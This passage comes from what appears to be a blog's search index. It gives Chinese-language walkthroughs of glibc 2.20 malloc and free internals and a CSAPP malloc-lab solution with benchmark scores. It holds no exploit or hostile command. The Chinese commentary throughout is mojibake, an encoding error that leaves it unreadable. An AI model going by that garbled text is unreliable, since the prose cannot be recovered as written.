binsçš„èŒƒå›´å†…ï¼Œé¦–å…ˆå°è¯•åœ¨fast binsä¸­å¯»æ‰¾é€‚åˆçš„chunkã€‚ é¦–å…ˆæ ¹æ®æ‰€éœ€chunkçš„å¤§å°è·å¾—è¯¥chunkæ‰€å±fast binçš„indexï¼Œæ ¹æ®è¯¥indexè·å¾—æ‰€éœ€fast binçš„ç©ºé—²chunké“¾è¡¨çš„å¤´æŒ‡é’ˆï¼Œç„¶åå°†å¤´æŒ‡é’ˆçš„ä¸‹ä¸€ä¸ªchunkä½œä¸ºç©ºé—²chunké“¾è¡¨çš„å¤´éƒ¨ã€‚ä¸ºäº†åŠ å¿«ä»fast binsä¸­åˆ†é…chunkï¼Œå¤„äºfast binsä¸­chunkçš„çŠ¶æ€ä»ç„¶ä¿æŒä¸ºinuseçŠ¶æ€ï¼Œé¿å…è¢«ç›¸é‚»çš„ç©ºé—²chunkåˆå¹¶ï¼Œä»fast binsä¸­åˆ†é…chunkï¼Œåªéœ€å–å‡ºç¬¬ä¸€ä¸ªchunkï¼Œå¹¶è°ƒç”¨chunk2mem()å‡½æ•°è¿”å›ç”¨æˆ·æ‰€éœ€çš„å†…å­˜å—ã€‚ /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) { idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) { if (victim == 0) /* initialization check */ malloc_consolidate (av); else { bck = victim-bk; if (__glibc_unlikely (bck-fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-bk = bck; bck-fd = bin; if (av != \u0026main_arena) victim-size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } å¦‚æœåˆ†é…çš„chunkå±äºsmall binï¼Œé¦–å…ˆæŸ¥æ‰¾chunkæ‰€å¯¹åº”small binsæ•°ç»„çš„indexï¼Œç„¶åæ ¹æ®indexè·å¾—æŸä¸ªsmall binçš„ç©ºé—²chunkåŒå‘å¾ªç¯é“¾è¡¨è¡¨å¤´ï¼Œç„¶åå°†æœ€åä¸€ä¸ªchunkèµ‹å€¼ç»™victimï¼Œå¦‚æœvictimä¸è¡¨å¤´ç›¸åŒï¼Œè¡¨ç¤ºè¯¥é“¾è¡¨ä¸ºç©ºï¼Œä¸èƒ½ä»small binçš„ç©ºé—²chunké“¾è¡¨ä¸­åˆ†é…ã€‚è‹¥victimä¸º0ï¼Œè¡¨ç¤ºsmall binå¹¶æ²¡æœ‰åˆå§‹åŒ–ã€‚æ‰€ä»¥è°ƒç”¨malloc_consolidateå°†è¯¥åˆ†é…åŒºfast binsä¸­chunkè¿›è¡Œåˆå¹¶ã€‚å¦åˆ™å¯¹è¯¥binä¸­æœ€åä¸€ä¸ªchunkè¿›è¡ŒåŒå‘é“¾è¡¨æ£€æŸ¥ï¼Œæ£€æŸ¥ä¸Šä¸€ä¸ªchunkçš„åä¸€ä¸ªæ˜¯å¦æ˜¯victimã€‚æ­£ç¡®ä¹‹åï¼Œè®¾ç½®å…¶æ§åˆ¶ä½ã€‚æœ€åå°†æŒ‡é’ˆè½¬åŒ–ä½memè¿”å›ç»™ç”¨æˆ·ã€‚ å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰é“¾è¡¨ä¸ºç©ºæ—¶çš„ç›¸åº”å¤„ç†ï¼Œè¿™ç§æƒ…å†µä¼šåœ¨ä¹‹åè¿›è¡Œå¤„ç†ã€‚ /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in o","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:2","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#sysmalloc"},{"categories":["Pwning"],"content":"malloc_consolidate static void malloc_consolidate(mstate av){ mfastbinptr* fb; /* current fastbin being consolidated */ mfastbinptr* maxfb; /* last fastbin (for loop control) */ mchunkptr p; /* current chunk being consolidated */ mchunkptr nextp; /* next chunk to consolidate */ mchunkptr unsorted_bin; /* bin header */ mchunkptr first_unsorted; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; mchunkptr bck; mchunkptr fwd; /* If max_fast is 0, we know that av hasn't yet been initialized, in which case do so below */ if (get_max_fast () != 0) { clear_fastchunks(av); unsorted_bin = unsorted_chunks(av); /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren't immediately going to be reused anyway. */ maxfb = \u0026fastbin (av, NFASTBINS - 1); fb = \u0026fastbin (av, 0); å°†åˆ†é…åŒºæœ€å¤§çš„ä¸€ä¸ªfast binèµ‹å€¼ç»™maxfbï¼Œç¬¬ä¸€ä¸ªfast binèµ‹å€¼ç»™fbï¼Œç„¶åéå†fast binsã€‚ do { p = atomic_exchange_acq (fb, 0); if (p != 0) { do { check_inuse_chunk(av, p); nextp = p-\u003efd; å°†ç©ºé—²chunké“¾è¡¨çš„ä¸‹ä¸€ä¸ªchunkèµ‹å€¼ç»™nextpã€‚ /* Slightly streamlined version of consolidation code in free() */ size = p-\u003esize \u0026 ~(PREV_INUSE|NON_MAIN_ARENA); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); è·å¾—å½“å‰chunkçš„sizeï¼Œéœ€è¦å»é™¤sizeä¸­çš„PREV_INUSEå’ŒNON_MAIN_ARENAæ ‡å¿—ï¼Œå¹¶è·å–ç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkå’Œä¸‹ä¸€ä¸ªchunkçš„å¤§å°ã€‚ if (!prev_inuse(p)) { prevsize = p-\u003eprev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(p, bck, fwd); } å¦‚æœå½“å‰chunkçš„å‰ä¸€ä¸ªchunkç©ºé—²ï¼Œåˆ™å°†å½“å‰chunkä¸å‰ä¸€ä¸ªchunkåˆå¹¶æˆä¸€ä¸ªç©ºé—²chunkï¼Œç”±äºå‰ä¸€ä¸ªchunkç©ºé—²ï¼Œåˆ™å½“å‰chunkçš„prev_sizeä¿å­˜äº†å‰ä¸€ä¸ªchunkçš„å¤§å°ï¼Œè®¡ç®—å‡ºåˆå¹¶åçš„chunkå¤§å°ï¼Œå¹¶è·å–å‰ä¸€ä¸ªchunkçš„æŒ‡é’ˆï¼Œå°†å‰ä¸€ä¸ªchunkä»ç©ºé—²é“¾è¡¨ä¸­åˆ é™¤ã€‚ if (nextchunk != av-\u003etop) { nextinuse = inuse_bit_at_offset(nextchunk, nextsize); å¦‚æœä¸å½“å‰chunkç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkä¸æ˜¯åˆ†é…åŒºçš„top chunkï¼ŒæŸ¥çœ‹ä¸å½“å‰chunkç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkæ˜¯å¦å¤„äºinuseçŠ¶æ€ã€‚ if (!nextinuse) { size += nextsize; unlink(nextchunk, bck, fwd); } else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-\u003efd; unsorted_bin-\u003efd = p; first_unsorted-\u003ebk = p; å¦‚æœä¸å½“å‰chunkç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkå¤„äºinuseçŠ¶æ€ï¼Œæ¸…é™¤å½“å‰chunkçš„inuseçŠ¶æ€ï¼Œåˆ™å½“å‰chunkç©ºé—²äº†ã€‚å¦åˆ™ï¼Œå°†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªç©ºé—²chunkä»ç©ºé—²é“¾è¡¨ä¸­åˆ é™¤ï¼Œå¹¶è®¡ç®—å½“å‰chunkä¸ä¸‹ä¸€ä¸ªchunkåˆå¹¶åçš„chunkå¤§å°ã€‚å°†åˆå¹¶åçš„chunkåŠ å…¥unsorted binçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­ã€‚ if (!in_smallbin_range (size)) { p-\u003efd_nextsize = NULL; p-\u003ebk_nextsize = NULL; } å¦‚æœåˆå¹¶åçš„chunkå±äºlarge binï¼Œå°†chunkçš„fd_nextsizeå’Œbk_nextsizeè®¾ç½®ä¸ºNULLï¼Œå› ä¸ºåœ¨unsorted binä¸­è¿™ä¸¤ä¸ªå­—æ®µæ— ç”¨ã€‚ set_head(p, size | PREV_INUSE); p-\u003ebk = unsorted_bin; p-\u003efd = first_unsorted; set_foot(p, size); } è®¾ç½®åˆå¹¶åçš„ç©ºé—²chunkå¤§å°ï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ªchunkå¤„äºinuseçŠ¶æ€ï¼Œå› ä¸ºå¿…é¡»ä¿è¯ä¸èƒ½æœ‰ä¸¤ä¸ªç›¸é‚»çš„chunkéƒ½å¤„äºç©ºé—²çŠ¶æ€ã€‚ç„¶åå°†åˆå¹¶åçš„chunkåŠ å…¥unsorted binçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­ã€‚æœ€åè®¾ç½®åˆå¹¶åçš„ç©ºé—²chunkçš„footï¼Œchunkç©ºé—²æ—¶å¿…é¡»è®¾ç½®footï¼Œè¯¥footå¤„äºä¸‹ä¸€ä¸ªchunkçš„prev_sizeä¸­ï¼Œåªæœ‰chunkç©ºé—²æ˜¯footæ‰æ˜¯æœ‰æ•ˆçš„ã€‚ else { size += nextsize; set_head(p, size | PREV_INUSE); av-\u003etop = p; } å¦‚æœå½“å‰chunkçš„ä¸‹ä¸€ä¸ªchunkä¸ºtop chunkï¼Œåˆ™å°†å½“å‰chunkåˆå¹¶å…¥top chunkï¼Œä¿®æ”¹top chunkçš„å¤§å°ã€‚ } while ( (p = nextp) != 0); ç›´åˆ°éå†å®Œå½“å‰fast binä¸­çš„æ‰€æœ‰ç©ºé—²chunkã€‚ } } while (fb++ != maxfb); } ç›´åˆ°éå†å®Œæ‰€æœ‰çš„fast binsã€‚ else { malloc_init_state(av); check_malloc_state(av); }} å¦‚æœptmallocæ²¡æœ‰åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–ptmallocã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:3","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#malloc_consolidate"},{"categories":["Pwning"],"content":"__libc_free void__libc_free (void *mem){ mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } åŒæ ·ï¼Œè¿™é‡Œæ£€æŸ¥äº†ç”¨æˆ·æ˜¯å¦å®ç°è‡ªå®šä¹‰çš„__free_hookã€‚ if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ { /* see if the dynamic brk/mmap threshold needs adjusting */ if (!mp_.no_dyn_threshold \u0026\u0026 p-\u003esize \u003e mp_.mmap_threshold \u0026\u0026 p-\u003esize \u003c= DEFAULT_MMAP_THRESHOLD_MAX) { mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk (p); return; } å¦‚æœå½“å‰freeçš„chunkæ˜¯é€šè¿‡mmap()åˆ†é…çš„ï¼Œè°ƒç”¨munmap_chunk()å‡½æ•°unmapæœ¬chunkã€‚munmap_chunk()å‡½æ•°è°ƒç”¨munmap()å‡½æ•°é‡Šæ”¾mmap()åˆ†é…çš„å†…å­˜å—ã€‚åŒæ—¶æŸ¥çœ‹æ˜¯å¦å¼€å¯äº†mmapåˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶ï¼Œé»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå¦‚æœå½“å‰freeçš„chunkçš„å¤§å°å¤§äºè®¾ç½®çš„mmapåˆ†é…é˜ˆå€¼ï¼Œå°äºmmapåˆ†é…é˜ˆå€¼çš„æœ€å¤§å€¼ï¼Œå°†å½“å‰chunkçš„å¤§å°èµ‹å€¼ç»™mmapåˆ†é…é˜ˆå€¼ï¼Œå¹¶ä¿®æ”¹mmapæ”¶ç¼©é˜ˆå€¼ä¸ºmmapåˆ†é…é˜ˆå€¼çš„2å€ã€‚é»˜è®¤æƒ…å†µä¸‹mmapåˆ†é…é˜ˆå€¼ä¸mmapæ”¶ç¼©é˜ˆå€¼ç›¸ç­‰ï¼Œéƒ½ä¸º128KBã€‚ ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0);} è·å–å½“å‰åˆ†é…åŒºæŒ‡é’ˆï¼Œæœ€åè°ƒç”¨_int_freeã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:4","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#__libc_free"},{"categories":["Pwning"],"content":"_int_free static void_int_free (mstate av, mchunkptr p, int have_lock){ INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ const char *errstr = NULL; int locked = 0; size = chunksize (p); è·å–å…¶chunk size /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ if (__builtin_expect ((uintptr_t) p \u003e (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) { errstr = \"free(): invalid pointer\"; errout: if (!have_lock \u0026\u0026 locked) (void) mutex_unlock (\u0026av-\u003emutex); malloc_printerr (check_action, errstr, chunk2mem (p)); return; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ if (__glibc_unlikely (size \u003c MINSIZE || !aligned_OK (size))) { errstr = \"free(): invalid size\"; goto errout; } check_inuse_chunk(av, p); ä¸Šé¢çš„ä»£ç ç”¨äºå®‰å…¨æ£€æŸ¥ï¼Œchunkçš„æŒ‡é’ˆåœ°å€ä¸èƒ½æº¢å‡ºï¼Œchunkçš„å¤§å°å¿…é¡»å¤§äºç­‰äºMINSIZEä¸”è¦æ±‚å¯¹é½ã€‚ /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long)(size) \u003c= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ \u0026\u0026 (chunk_at_offset(p, size) != av-\u003etop)#endif ) { if (__builtin_expect (chunk_at_offset (p, size)-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) \u003e= av-\u003esystem_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); mutex_lock(\u0026av-\u003emutex); locked = 1; chunk_at_offset (p, size)-\u003esize \u003c= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) \u003e= av-\u003esystem_mem; })) { errstr = \"free(): invalid next size (fast)\"; goto errout; } if (! have_lock) { (void)mutex_unlock(\u0026av-\u003emutex); locked = 0; } } å¦‚æœå½“å‰freeçš„chunkå±äºfast binsï¼ŒæŸ¥çœ‹ä¸‹ä¸€ä¸ªç›¸é‚»çš„chunkçš„å¤§å°æ˜¯å¦å°äºç­‰äº2*SIZE_SZï¼Œä¸‹ä¸€ä¸ªç›¸é‚»chunkçš„å¤§å°æ˜¯å¦å¤§äºåˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜æ€»é‡ï¼Œå¦‚æœæ˜¯ï¼ŒæŠ¥é”™ã€‚è¿™é‡Œè®¡ç®—ä¸‹ä¸€ä¸ªç›¸é‚»chunkçš„å¤§å°ä¼¼ä¹æœ‰ç‚¹é—®é¢˜ï¼Œå› ä¸ºchunkçš„sizeå­—æ®µä¸­åŒ…å«äº†ä¸€äº›æ ‡å¿—ä½ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¸‹ä¸€ä¸ªç›¸é‚»chunkçš„sizeä¸­çš„PREV_INUSEæ ‡å¿—ä½ä¼šç½®ä½ï¼Œä½†è¿™é‡Œå°±æ˜¯è¦æ£€å‡ºé”™çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ä¸‹ä¸€ä¸ªç›¸é‚»chunkçš„sizeä¸­æ ‡å¿—ä½éƒ½æ²¡æœ‰ç½®ä½ï¼Œå¹¶ä¸”è¯¥chunkå¤§å°ä¸º2*SIZE_SZçš„é”™è¯¯æƒ…å†µã€‚å¦‚æœè°ƒç”¨æœ¬å‡½æ•°å‰æ²¡æœ‰å¯¹åˆ†é…åŒºåŠ é”ï¼Œ æ‰€ä»¥è¯»å–åˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜æ€»é‡éœ€è¦å¯¹åˆ†é…åŒºåŠ é”ï¼Œæ£€æŸ¥å®Œä»¥åï¼Œé‡Šæ”¾åˆ†é…åŒºçš„é”ã€‚ free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = \u0026fastbin (av, idx); è®¾ç½®å½“å‰åˆ†é…åŒºçš„fast bin flagï¼Œè¡¨ç¤ºå½“å‰åˆ†é…åŒºçš„fast binsä¸­å·²æœ‰ç©ºé—²chunkã€‚ç„¶åæ ¹æ®å½“å‰freeçš„chunkå¤§å°è·å–æ‰€å±çš„fast binã€‚ /* Atomically link P to its fastbin: P-\u003eFD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock \u0026\u0026 old != NULL) old_idx = fastbin_index(chunksize(old)); p-\u003efd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock \u0026\u0026 old != NULL \u0026\u0026 __builtin_expect (old_idx != idx, 0)) { errstr = \"invalid fastbin entry (free)\"; goto errout; } } è¿™é‡Œæ£€æŸ¥äº†å½“å‰é‡Šæ”¾çš„chunkå’Œä¹‹å‰é‡Šæ”¾çš„fastbin chunkæ˜¯å¦ç›¸åŒï¼Œç›¸åŒåˆ™è§¦å‘äº†double freeï¼Œæ ¡éªŒè¡¨å¤´ä¸ä¸ºNULLæƒ…å†µä¸‹ï¼Œä¿è¯è¡¨å¤´chunkçš„æ‰€å±çš„fast binä¸å½“å‰freeçš„chunkæ‰€å±çš„fast binç›¸åŒã€‚ /* Consolidate other non-mmapped chunks as they arrive. */ else if (!chunk_is_mmapped(p)) { if (! have_lock) { (void)mutex_lock(\u0026av-\u003emutex); locked = 1; } nextchunk = chunk_at_offset(p, size); å¦‚æœå½“å‰freeçš„chunkä¸æ˜¯é€šè¿‡mmap()åˆ†é…çš„ï¼Œå¹¶ä¸”å½“å‰è¿˜æ²¡æœ‰è·å¾—åˆ†é…åŒº","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:5","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_int_free"},{"categories":["Pwning"],"content":"Endåˆ°è¿™é‡Œï¼Œmallocçš„åªè¦æ¡†æ¶ä¸é€»è¾‘å°±åˆ†æå®Œäº†ã€‚åœ¨å¾ˆå¤šéš¾æ‡‚å¾—åœ°æ–¹éƒ½å‚è€ƒäº†ã€Šptmallocæºç åˆ†æã€‹ï¼Œæ¨èè¯»ä¸€ä¸‹ã€‚ä¸è¿‡æƒ³è¦æ·±å…¥çš„ç†è§£å †çš„è¯ï¼Œè¿˜æ˜¯è¦è‡ªå·±åŠ¨æ‰‹å®ç°ä¸€ä¸ªå†…å­˜åˆ†é…å™¨ã€‚è¿™æ ·æ‰èƒ½çŸ¥é“å“ªä¸€éƒ¨åˆ†æ˜¯è¦å¹²ä»€ä¹ˆçš„ï¼Œä¹Ÿèƒ½æ›´å¥½çš„ç†è§£æºç ã€‚è¿™æ¬¡ä»…ä»…æ˜¯glibc-2.20ï¼Œåœ¨æ–°çš„glibcä¸­æœ‰äº†æ–°çš„æœºåˆ¶ï¼Œè¿™éƒ¨åˆ†åœ¨ä¹‹åè¿›è¡Œè¡¥å……åˆ†æã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:7:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#end"},{"categories":["Pwning"],"content":"CSAPP-Malloclabå¤§è‡´æ¡†æ¶ä½¿ç”¨è¯¾æœ¬ä¸Šçš„ç¤ºä¾‹ï¼Œè¡¥å……ä¸€äº›å®å®šä¹‰ã€‚ /* Basic constants and macros */ #define WSIZE 4 /* Word and header/footer size (bytes) */#define DSIZE 8 /* Double word size (bytes) */#define CHUNKSIZE (1\u003c\u003c12) /* Extend heap by this amount (bytes) */#define MINBLOCKSIZE 16 #define MAX(x, y) ((x) \u003e (y) ? (x) : (y)) /* Pack a size and allocated bit into a word */ #define PACK(size, alloc) ((size) | (alloc)) /* Read and write a word at address p */ #define GET(p) (*(unsigned int *)(p)) /* read a word at address p */#define PUT(p, val) (*(unsigned int *)(p) = (val)) /* write a word at address p */ #define GET_SIZE(p) (GET(p) \u0026 ~0x7) /* read the size field from address p */#define GET_ALLOC(p) (GET(p) \u0026 0x1) /* read the alloc field from address p */ #define HDRP(bp) ((char*)(bp) - WSIZE) /* given block ptr bp, compute address of its header */#define FTRP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) /* given block ptr bp, compute address of its footer */ #define NEXT_BLKP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp))) /* given block ptr bp, compute address of next blocks */#define PREV_BLKP(bp) ((char*)(bp) - GET_SIZE((char*)(bp)-DSIZE)) /* given block ptr bp, compute address of prev blocks */ æ­¤æ—¶ï¼Œchunkçš„ç»“æ„ä¸ºï¼š struct chunk{ int header; /*header==footer*/ char data[size]; char padding[align]; int footer; } ä¹¦ä¸­å®ç°äº†mm_init, mm_malloc, mm_free, extend_heap, coalesce, æ ¹æ®ä¹¦ä¸­çš„ä»£ç æˆ‘ä»¬å®ç°ï¼š mm_realloc void *mm_realloc(void *ptr, size_t size) { void *new_ptr; if(ptr==NULL){ new_ptr=mm_malloc(size); if (new_ptr == NULL) return NULL; return new_ptr; } if(size==0){ mm_free(ptr); return NULL; } if(size==GET_SIZE(HDRP(ptr))){ return ptr; } else{ new_ptr=mm_malloc(size); if (new_ptr == NULL) return NULL; memcpy(new_ptr, ptr, size-WSIZE); mm_free(ptr); return new_ptr; } } place static void place(void *bp, size_t asize){ size_t size=GET_SIZE(HDRP(bp)); PUT(HDRP(bp),PACK(size, 1)); PUT(FTRP(bp),PACK(size, 1)); split_block(bp,asize); } split_block static void split_block(void *bp, size_t asize){ size_t size =GET_SIZE(HDRP(bp)); if((size-asize)\u003e=MINBLOCKSIZE){ PUT(HDRP(bp), PACK(asize, 1)); PUT(FTRP(bp), PACK(asize, 1)); bp = NEXT_BLKP(bp); PUT(HDRP(bp), PACK((size-asize),0)); PUT(FTRP(bp),PACK((size-asize),0)); coalesce(bp); } } next_fit static void *next_fit(size_t asize){ char* bp; for ( bp = prev_listp; GET_SIZE(HDRP(bp)) \u003e 0; bp = NEXT_BLKP(bp)) { if (!GET_ALLOC(HDRP(bp)) \u0026\u0026 GET_SIZE(HDRP(bp)) \u003e= asize) { prev_listp = bp; return bp; } } for ( bp = heap_listp; bp != prev_listp; bp = NEXT_BLKP(bp)) { if (!GET_ALLOC(HDRP(bp)) \u0026\u0026 GET_SIZE(HDRP(bp)) \u003e= asize) { prev_listp = bp; return bp; } } return NULL; } è¿™é‡Œä½¿ç”¨çš„æ˜¯éšå¼é“¾è¡¨+next fitï¼Œå¾—åˆ†ï¼š Results for mm malloc: trace valid util ops secs Kops 0 yes 91% 5694 0.001710 3329 1 yes 92% 5848 0.000948 6166 2 yes 95% 6648 0.002903 2290 3 yes 97% 5380 0.003700 1454 4 yes 66% 14400 0.000099146193 5 yes 91% 4800 0.004307 1114 6 yes 89% 4800 0.003500 1371 7 yes 55% 12000 0.014687 817 8 yes 51% 24000 0.007490 3204 9 yes 27% 14401 0.048774 295 10 yes 45% 14401 0.001818 7919 Total 73% 112372 0.089937 1249 Perf index = 44 (util) + 40 (thru) = 84/100 ","date":"2021-02-21","objectID":"/csapp-malloclab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Malloclab","uri":"/csapp-malloclab/#csapp-malloclab"},{"categories":["Pwning"],"content":"æ”¹è¿›ï¼šæ˜¾å¼é“¾è¡¨+first fitæœ€å¼€å§‹ä½¿ç”¨çš„æ˜¯first_fitåªæœ‰50+ï¼Œæ”¹ä¸ºnext_fitä¹‹åè¾¾åˆ°äº†80+ï¼Œåœ¨æœç´¢çš„æ—¶å€™å‡ ä¹æ˜¯åœ¨éå†æ•´ä¸ªå †æ®µï¼Œæ‰€ä»¥æƒ³åˆ°ä½¿ç”¨æ˜¾ç¤ºé“¾è¡¨çš„æ–¹æ³•æ¥ç®¡ç†ç©ºé—²chunkã€‚ ä¿®æ”¹free_chunkç»“æ„ï¼š struct chunk{ int header; /*header==footer*/ chunk *fd; /*prev free chunk*/ chunk *bk; /*next free chunk*/ int footer; } æ·»åŠ å®šä¹‰ï¼š #define FD(bp) ((char *)(bp)) #define BK(bp) ((char *)(bp)+WSIZE) #define SET_PTR(p,ptr) (*(unsigned int *)(p) = (unsigned int)(ptr)) #define GET_NEXT(bp) (*(char **)(BK(bp))) #define GET_PREV(bp) (*(char **)(bp)) static char* free_listp; //manage all free chunk static void insert_freelist(void* bp); static void remove_freelist(void* bp); è¿™é‡Œçš„fdï¼Œbkä¸glibcä¸­çš„mallocæ˜¯ç›¸ä¼¼çš„ã€‚ insert_freelist static void insert_freelist(void* bp) { if (bp == NULL) return; if (free_listp == NULL) { free_listp = bp; SET_PTR(FD(bp),NULL); //at the end of the list fd will be null; SET_PTR(BK(bp),NULL); //at the begin of the list bk will be null; } else { void *old=free_listp; free_listp = bp; SET_PTR(FD(bp),old); SET_PTR(BK(bp),NULL); SET_PTR(BK(old),bp); } return; } remove_freelist static void remove_freelist(void* bp) { if(GET_NEXT(bp)!=NULL) { if(GET_PREV(bp)!=NULL) /* free_listp--\u003exxx-\u003ebp--\u003exxx */ { SET_PTR(FD(GET_NEXT(bp)),GET_PREV(bp)); SET_PTR(BK(GET_PREV(bp)),GET_NEXT(bp)); } else /* free_listp--\u003exxx-\u003ebp */ { SET_PTR(FD(GET_NEXT(bp)),NULL); } } else { if(GET_PREV(bp)!=NULL) /* free_listp--\u003ebp--\u003exxx */ { SET_PTR(BK(GET_PREV(bp)),NULL); free_listp=GET_PREV(bp); } else /* free_listp--\u003ebp */ { free_listp=NULL; } } } first_fit static void *find_fit(size_t asize) { void *bp=free_listp; for(;bp!=NULL;bp=GET_PREV(bp)) { if(asize\u003c=GET_SIZE(HDRP(bp))) return bp; } return NULL; } ä½†æ˜¯åˆ†æ•°æ²¡æœ‰å˜åŒ–ã€‚ Results for mm malloc: trace valid util ops secs Kops 0 yes 89% 5694 0.000159 35789 1 yes 92% 5848 0.000106 55326 2 yes 94% 6648 0.000232 28717 3 yes 96% 5380 0.000177 30361 4 yes 100% 14400 0.000095151739 5 yes 88% 4800 0.000379 12668 6 yes 85% 4800 0.000507 9471 7 yes 55% 12000 0.004043 2968 8 yes 51% 24000 0.002807 8549 9 yes 26% 14401 0.058122 248 10 yes 34% 14401 0.002460 5854 Total 74% 112372 0.069087 1627 Perf index = 44 (util) + 40 (thru) = 84/100 ","date":"2021-02-21","objectID":"/csapp-malloclab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Malloclab","uri":"/csapp-malloclab/#æ”¹è¿›æ˜¾å¼é“¾è¡¨first-fit"},{"categories":["Pwning"],"content":"æ”¹è¿›ï¼šåˆ†ç¦»é“¾è¡¨+first 